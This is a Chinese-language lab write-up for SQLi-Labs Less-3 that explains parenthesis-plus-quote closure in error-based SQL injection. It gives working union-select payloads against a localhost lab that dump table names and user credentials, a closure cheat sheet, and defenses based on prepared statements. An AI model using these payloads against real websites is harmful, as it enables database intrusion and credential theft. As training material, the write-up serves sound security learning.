# SQLi-Labs Less-3 括号闭合注入 通关笔记

> Less-1、Less-2、Less-3 查的是同一张表、同一个库、同一批数据。
>
> **区别只在"怎么闭合"。**
>
> 这一篇把三关放在一起对照。

---

## 一、这题在干什么

| 项目 | 内容 |
| --- | --- |
| 靶场 | SQLi-Labs |
| 关卡 | Less-3 (Error Based - Single Quote with twist) |
| 地址 | `http://localhost/sqli-labs/Less-3/` |
| 参数 | `id`（GET） |
| 类型 | 字符型 + **括号**（`('$id')`） |
| 目标 | 读出 `security.users` 表的账号密码 |

**和前两关一模一样的表、一样的库、一样的字段。**

---

## 二、和 L1 / L2 的差别：闭合方式

### 2.1 三关后台写法

```php
// Less-1（字符型）
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
                                    ↑  ↑

// Less-2（数字型）
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
                                    ↑

// Less-3（字符型 + 括号）
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
                                    ↑   ↑
                                 括号 + 引号
```

### 2.2 判断测试的实际结果

| 测试 | Less-1 | Less-2 | Less-3 |
| --- | --- | --- | --- |
| `?id=1` | 正常 | 正常 | 正常 |
| `?id=1'` | 报错 | 报错 | 报错 |
| `?id=1' --+` | **恢复** | 报错 | **报错** |
| `?id=1') --+` | 正常 | 报错 | **恢复** |
| `?id=1 --+` | 正常 | **恢复** | 正常 |

### 2.3 怎么读

| 现象 | 结论 |
| --- | --- |
| `' --+` 能恢复 | 字符型，只有引号 |
| `' --+` 报错，`')--+` 恢复 | **字符型 + 括号** |
| `' --+` 报错，`--+` 单独正常 | 数字型 |

**Less-3 的特征：加引号补不全，必须把括号也补上。**

---

## 三、我的解题步骤

### 步骤 1：正常查询

```
http://localhost/sqli-labs/Less-3/?id=1
```

返回：

```
Your Login name:Dumb
Your Password:Dumb
```

### 步骤 2：判断闭合

```
?id=1'          → 报错
?id=1' --+      → 仍然报错
?id=1') --+     → 正常（Dumb）
```

**判定：后台是 `id=('$id')`，闭合符是 `')`。**

### 步骤 3：数几列

```
?id=1') order by 3 --+   → 正常
?id=1') order by 4 --+   → 报错
```

**3 列。**

### 步骤 4：找回显位

```
?id=-1') union select 1,2,3 --+
```

实测返回：

```
Your Login name:2
Your Password:3
```

### 步骤 5：爆库名

```
?id=-1') union select 1,database(),version() --+
```

实测返回：

```
Your Login name:security
Your Password:5.7.26
```

### 步骤 6：爆表名

```
?id=-1') union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+
```

实测返回：

```
Your Login name:emails,referers,uagents,users
Your Password:3
```

### 步骤 7：爆字段名

```
?id=-1') union select 1,group_concat(column_name),3
from information_schema.columns where table_name='users' and table_schema=database() --+
```

实测返回：

```
Your Login name:id,username,password
```

### 步骤 8：取数据

```
?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+
```

实测返回：

```
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,
secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,
admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,
dhakkan:dumbo,admin4:admin4
```

**14 条记录，和前两关完全一致。**

---

## 四、原理分析

### 4.1 为什么只加单引号不够

```sql
-- 输入 1'
SELECT * FROM users WHERE id=('1'') LIMIT 0,1
                              ↑↑
                        引号配上了

-- 但后面还有：
                              ...
                                  ') LIMIT 0,1
                                   ↑
                              这个括号没人管
```

**MySQL 报的是括号不匹配（或者引号与括号错位），不是缺引号。**

### 4.2 为什么 `') ` 就对了

```sql
-- 输入 1')
SELECT * FROM users WHERE id=('1') --+ ') LIMIT 0,1
                              ↑↑  ↑
                           引号   括号
```

**两个符号各自配上了自己的一半，然后 `--` 把剩下的全注释掉。**

**这就是"闭合的完整含义"：**

> **不只是把引号补上，而是要把"引号 + 括号 + 其他外壳"全部配对。**

### 4.3 括号从哪来的

常见的后台写法：

```php
// 有的程序会写成
$sql = "SELECT * FROM users WHERE id=($id)";
$sql = "SELECT * FROM users WHERE id=('$id')";
$sql = "SELECT * FROM users WHERE id=(\"$id\")";
```

**为什么加括号？** 因为原代码可能是：

```php
$sql = "SELECT * FROM users WHERE id=(" . intval($id) . ")";
```

后来有人把 `intval` 换成直接拼接，括号就留下来了。

**括号本身不防注入，它只是让闭合多一步。**

### 4.4 一个坑：隐式类型转换

我测试时发现：

```
?id=1) --+     → 居然也返回 Dumb！
```

**原因：`id` 是 INT 列，MySQL 会做隐式类型转换。**

```sql
WHERE id=('1) -- ')
-- 字符串 '1) -- ' 转成数字 → 1
-- 因为 id 是整数列
```

**但这只是"能查到数据"，不是"能注入"：**

```
?id=-1) union select 1,2,3 --+
→ 字符串 '-1) union select 1,2,3 -- ' 转成数字 → -1
→ 整个 union 被当成字符串的一部分，不会执行
```

**所以正经的闭合还是 `')`。**

---

## 五、三关全面对比

### 5.1 核心差异

| | Less-1 | Less-2 | Less-3 |
| --- | --- | --- | --- |
| 类型 | 字符型 | 数字型 | 字符型 + 括号 |
| 后台写法 | `id='$id'` | `id=$id` | `id=('$id')` |
| 闭合符 | `'` | 无 | `')` |
| 判断关键 | `' --+` 恢复 | `--+` 单独正常 | `') --+` 恢复 |

### 5.2 payload 逐句对照

| 步骤 | Less-1 | Less-2 | Less-3 |
| --- | --- | --- | --- |
| 判断 | `?id=1'` | `?id=1'` | `?id=1'` |
| 恢复 | `?id=1' --+` | `?id=1 --+` | `?id=1') --+` |
| 列数 | `?id=1' order by 3 --+` | `?id=1 order by 3 --+` | `?id=1') order by 3 --+` |
| 显位 | `?id=-1' union select 1,2,3 --+` | `?id=-1 union select 1,2,3 --+` | `?id=-1') union select 1,2,3 --+` |
| 爆库 | `database()` | `database()` | `database()` |
| 爆表 | `tables` | `tables` | `tables` |
| 爆字段 | `columns` | `columns` | `columns` |
| 取数据 | `from users` | `from users` | `from users` |

**从"显位"开始，三关完全一模一样——只有闭合部分不同。**

### 5.3 一句话记住三关

| 关卡 | 后台 | 你该输入 |
| --- | --- | --- |
| L1 | `id='$id'` | `-1' union ...` |
| L2 | `id=$id` | `-1 union ...` |
| L3 | `id=('$id')` | `-1') union ...` |

**规律：后台有几个"外壳符号"，你就在 `-1` 后面补几个。**

### 5.4 结果对照

| 关卡 | 表名 | 字段 | 数据条数 |
| --- | --- | --- | --- |
| L1 | `emails,referers,uagents,users` | `id,username,password` | 14 |
| L2 | 同上 | 同上 | 14 |
| L3 | 同上 | 同上 | 14 |

**三关查的是同一个库，所以结果完全一样。**

---

## 六、知识点与笔记

### 6.1 闭合速查表

| 后台写法 | 闭合 payload |
| --- | --- |
| `id=$id` | `-1 union select ...` |
| `id='$id'` | `-1' union select ...` |
| `id="$id"` | `-1" union select ...` |
| `id=($id)` | `-1) union select ...` |
| `id=('$id')` | `-1') union select ...` |
| `id=("$id")` | `-1") union select ...` |

**规律：把后台包住你的符号，原样补一遍。**

### 6.2 判断流程

```
? id=1'
   ├─ 正常 → 可能不报错，试 and 1=1 / 1=2
   └─ 报错
        ├─ ?id=1' --+ 恢复        → 字符型，闭合 '
        ├─ ?id=1') --+ 恢复       → 字符型 + 括号，闭合 ')
        ├─ ?id=1") --+ 恢复       → 字符型 + 双引号括号
        └─ 都不恢复，但 ?id=1 --+ 正常 → 数字型
```

### 6.3 为什么 `--+` 必须带 `+`

```sql
-- 不生效
WHERE id=('1' --') ...

-- 生效
WHERE id=('1' -- ') ...
                ↑
            -- 后面必须有空白
```

**URL 里 `+` 会被解码成空格。**

### 6.4 隐式类型转换的坑

| 输入 | MySQL 理解 |
| --- | --- |
| `'1abc'` | `1` |
| `'1) -- '` | `1` |
| `'-1 union select'` | `-1` |

**规则：从左往右取数字，遇到非数字就停。**

**后果：**

- 可能"意外查到数据"（让你以为闭合对了）
- 也可能"整个 payload 被当成字符串"，注入不成立

**判断闭合要看"报错是否消失"，不是看"有没有数据"。**

### 6.5 常用函数

| 函数 | 作用 |
| --- | --- |
| `database()` | 当前库名 |
| `version()` | 版本 |
| `group_concat()` | 多行拼一行 |
| `information_schema.tables` | 所有表 |
| `information_schema.columns` | 所有字段 |
| `0x3a` | 冒号 `:` |

---

## 七、防御怎么写

### 7.1 括号不是防护

**很多人以为"加括号就安全了"——完全错误。**

```php
// 依然可注入
$sql = "SELECT * FROM users WHERE id=('$id')";
```

**括号只是让攻击者多写一个字符。**

### 7.2 根本解：预编译

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->bind_param('i', $id);
$stmt->execute();
```

**`?` 占位符会把输入当纯数据，无论输入什么都不会变成语法。**

### 7.3 类型转换

```php
$id = intval($_GET['id']);
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

**`intval` 会把 `1') union ...` 变成 `1`。**

### 7.4 三层防御

| 层 | 做法 |
| --- | --- |
| 代码层 | 预编译 / 类型转换 |
| 数据库层 | 最小权限、关闭报错 |
| 运维层 | WAF、审计日志 |

---

## 八、总结

### 九步流程（三关通用）

| 步骤 | 内容 | 只有这一步三关不同 |
| --- | --- | --- |
| 1 | 判断闭合 | ✅ **L1:`'` / L2:无 / L3:`')`** |
| 2 | order by 数列 | 之后完全相同 |
| 3 | union 找显位 | 相同 |
| 4 | database() | 相同 |
| 5 | tables | 相同 |
| 6 | columns | 相同 |
| 7 | 取数据 | 相同 |

### 一句话

> **Less-3 相比 Less-1，只是后台多包了一层括号。**
>
> **你要做的，就是把引号和括号一起补上：`')`**
>
> **闭合的本质不是"补一个字符"，而是"把外壳全部配对"。**

### 三关一起记

| 关卡 | 后台 | 闭合 |
| --- | --- | --- |
| Less-1 | `id='$id'` | `'` |
| Less-2 | `id=$id` | 无 |
| Less-3 | `id=('$id')` | `')` |
| Less-4 | `id=("$id")` | `")` |

**这四关是同一个模板，只是外壳不同。**

---

## 参考

- [sqli-labs GitHub](https://github.com/Audi-1/sqli-labs)
- [sqli-labs php7 兼容版](https://github.com/happygongzhuo/sqli-labs-php7)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
